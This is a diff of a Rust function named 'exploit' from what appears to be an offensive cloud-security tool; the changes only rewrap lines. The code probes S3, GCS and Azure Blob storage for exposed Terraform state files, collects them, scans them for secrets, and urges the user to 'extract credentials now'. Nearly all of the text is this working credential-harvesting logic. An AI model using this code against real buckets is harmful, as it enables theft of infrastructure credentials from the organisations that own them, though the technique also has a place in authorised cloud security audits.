@@ -75,7 +75,12 @@ pub async fn exploit(bucket: &str, token: Option<&str>, timeout: u64) -> anyhow:
     println!("{} Terraform State File Exploitation", "[*]".cyan().bold());
     println!("{}", "=".repeat(60).cyan());
     println!("{} Bucket: {}", "[*]".cyan().bold(), bucket);
-    println!("{} Testing {} paths across {} regions", "[*]".cyan().bold(), TFSTATE_PATHS.len(), S3_REGIONS.len());
+    println!(
+        "{} Testing {} paths across {} regions",
+        "[*]".cyan().bold(),
+        TFSTATE_PATHS.len(),
+        S3_REGIONS.len()
+    );
     println!("{}", "-".repeat(60).dimmed());
 
     let client = build_client(timeout, token);
@@ -89,8 +94,16 @@ pub async fn exploit(bucket: &str, token: Option<&str>, timeout: u64) -> anyhow:
                     let status = resp.status().as_u16();
                     if status == 200 {
                         let body = resp.text().await.unwrap_or_default();
-                        if body.contains("terraform") || body.contains("resources") || body.contains("\"version\"") {
-                            println!("  {} {:60} {}", "*".green().bold(), path, "TFSTATE FOUND".red().bold());
+                        if body.contains("terraform")
+                            || body.contains("resources")
+                            || body.contains("\"version\"")
+                        {
+                            println!(
+                                "  {} {:60} {}",
+                                "*".green().bold(),
+                                path,
+                                "TFSTATE FOUND".red().bold()
+                            );
                             found_states.push((path.to_string(), region.to_string(), body.clone()));
 
                             let mut secrets_found = Vec::new();
@@ -122,10 +135,16 @@ pub async fn exploit(bucket: &str, token: Option<&str>, timeout: u64) -> anyhow:
     }
 
     if found_states.is_empty() {
-        println!("  {} No tfstate files found in bucket.", "[-]".yellow().bold());
+        println!(
+            "  {} No tfstate files found in bucket.",
+            "[-]".yellow().bold()
+        );
         println!("  {} Trying GCS and Azure Blob...", "[*]".cyan().bold());
 
-        let gcs_url = format!("https://storage.googleapis.com/{}/terraform.tfstate", bucket);
+        let gcs_url = format!(
+            "https://storage.googleapis.com/{}/terraform.tfstate",
+            bucket
+        );
         match client.get(&gcs_url).send().await {
             Ok(resp) if resp.status().as_u16() == 200 => {
                 let body = resp.text().await.unwrap_or_default();
@@ -137,7 +156,10 @@ pub async fn exploit(bucket: &str, token: Option<&str>, timeout: u64) -> anyhow:
             _ => {}
         }
 
-        let azure_url = format!("https://{}.blob.core.windows.net/terraform/terraform.tfstate", bucket);
+        let azure_url = format!(
+            "https://{}.blob.core.windows.net/terraform/terraform.tfstate",
+            bucket
+        );
         match client.get(&azure_url).send().await {
             Ok(resp) if resp.status().as_u16() == 200 => {
                 let body = resp.text().await.unwrap_or_default();
@@ -150,7 +172,11 @@ pub async fn exploit(bucket: &str, token: Option<&str>, timeout: u64) -> anyhow:
         }
     }
 
-    println!("\n{} Summary: {} tfstate file(s) found", "[*]".cyan().bold(), found_states.len());
+    println!(
+        "\n{} Summary: {} tfstate file(s) found",
+        "[*]".cyan().bold(),
+        found_states.len()
+    );
     for (path, region, body) in &found_states {
         let secrets: Vec<&str> = SENSITIVE_PATTERNS
             .iter()
@@ -171,7 +197,10 @@ pub async fn exploit(bucket: &str, token: Option<&str>, timeout: u64) -> anyhow:
     }
 
     if !found_states.is_empty() {
-        println!("\n{} Terraform state contains infrastructure secrets — extract credentials now!", "[!]".red().bold());
+        println!(
+            "\n{} Terraform state contains infrastructure secrets — extract credentials now!",
+            "[!]".red().bold()
+        );
     }
     Ok(())
 }
